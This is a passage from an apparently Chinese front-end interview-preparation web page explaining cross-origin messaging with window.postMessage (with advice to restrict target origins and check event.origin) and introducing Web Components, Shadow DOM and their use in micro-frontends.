，支持跨域。</p> <p>通过 <code>window.postMessage</code> 发送消息。注意第二个参数，可以限制域名，如发送敏感信息，要限制域名。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 父页面向 iframe 发送消息</span>
window<span class="token punctuation">.</span>iframe1<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>

<span class="token comment">// iframe 向父页面发送消息</span>
window<span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'world'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
</code></pre></div><p>可监听 <code>message</code> 来接收消息。可使用 <code>event.origin</code> 来判断信息来源是否合法，可选择不接受。</p> <div class="language-js extra-class"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'origin'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>origin<span class="token punctuation">)</span> <span class="token comment">// 通过 origin 判断是否来源合法</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'child received'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h2 id="说一下什么是-web-components"><a href="#说一下什么是-web-components" class="header-anchor">#</a> 说一下什么是 web components？</h2> <p><img src="/assets/img/509766110-62a6a34223a7d_fix732.14eb8b98.png" alt=""></p> <p>在 html5 提供的 video 组件实现上采用了 Shadow DOM 技术，Shadow DOM 技术是 Web Components 核心套件之一，还有像 input、select 也都采用了这个技术，具体什么是 Shadow DOM 会在下文中给出解释。</p> <p>基于业务，我们先看一个订单卡片的视觉稿：</p> <p><img src="/assets/img/238335806-62a6a35f4998b_fix732.b8c6a6ef.png" alt=""></p> <p>用 Web Components 实现，代码展示如下</p> <p><img src="/assets/img/2131097858-62a6a36fa99d0_fix732.9c584347.png" alt=""></p> <p>这里涉及到 Web Components 的三大技术套件</p> <ul><li>Template: 利用 Template 生成 DOM；</li> <li>Shadow DOM：利用 Shadow DOM 来隔离 CSS 样式；</li> <li>Custom Elements: 利用 Custom Elements 来自定义元素，继承自 HTMLElement，HTMLElement 是 DOM API 里面的一个类，继承该类就有了 html 的常见属性和 API，利用 Custom Elements 来自定义元素；</li></ul> <p>Template 和 Custom Elements 都比较好理解，那什么是 Shadow DOM 呢？</p> <p><img src="/assets/img/3598404087-62a6a39597d9e_fix732.1f236b26.png" alt=""></p> <p>你可以简单理解为 Shadow DOM 是一个独立的沙箱，与其它的 DOM 元素互不干扰，能天然做到 CSS 的样式隔离！类似于 Vue 中带 Scoped 的 style 标签，它不会干扰其它标签样式。</p> <p>下面我们来看下更具象<order-card></order-card>的组件代码：</p> <p><img src="/assets/img/1136884287-62a6a3b141ac9_fix732.d1a4811e.png" alt=""></p> <p>目前组件的内容是写死的，该怎么动态生成 DOM 呢？我们继续往下看：</p> <p><img src="/assets/img/4027621908-62a6a3d575a4d_fix732.808f8de0.png" alt=""></p> <p>答案就是借助 Web Components 组件的生命周期来做，其中 connectedCallback 就是 dom 节点首次挂载调用，且只会调用一次，在这里可以拿到外部传入的属性。属性变更会调用 attributeChangedCallback, 在这里可以做 dom 更新相关的事情，这里不在展开，大家可以自行探索下。</p> <p>dom 能动态生成了，点击事件怎么玩？</p> <p>其实和大家平时写 Vue 组件、React 组件一样，在 Vue 中是 @click，在 React 中是 onClick，具体示例可参考下图：</p> <p><img src="/assets/img/3576985798-62a6a3ef92161_fix732.94aa364c.png" alt=""></p> <p>Web Components 具有如下特点：
<img src="/assets/img/1205191359-62a6a406790dd_fix732.5ca7643e.png" alt=""></p> <p>其应用场景也比较丰富：
<img src="/assets/img/3706511058-62a6a411883f0_fix732.2673e153.png" alt=""></p> <p>微前端的几个基本要素：技术栈无关、应用隔离、独立开发。目前 Web Components 都符合，理论上用 Web Components 做微前端也是可行的。</p> <p><img src="/assets/img/1229638429-62a6a48f05557_fix732.3cb0c983.png" alt=""></p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">7/30/2023, 11:03:59 AM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev"><a href="/interview/article-1.html" class="prev"><i aria-label="icon: left" class="anticon anticon-left"><svg viewBox="64 64 896 896" focusable="false" data-icon="left" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8a31.86 31.86 0 0 0 0 50.3l450.8 352.1c5.3 4.1 12.9.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path></svg></i>
        CSS面试题
      </a></span> <span class="next"><a href="/interview/article-3.html">
        webpack和babel面试题
        <i aria-label="icon: right" class="anticon anticon-right"><svg viewBox="64 64 896 896" focusable="false" data-icon="right" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M765.7 486.8L314.9 134.7A7.97 7.97 0 0 0 302 141v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1a31.96 31.96 0 0 0 0-50.4z"></path></svg></i></a></span></p></div> </main> <!----></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.18cfc572.js" defer></script><script src="/assets/js/3.a5cb75aa.js" defer></script><script src="/assets/js/6.bc437b1e.js" defer></script>
  </body>
</html>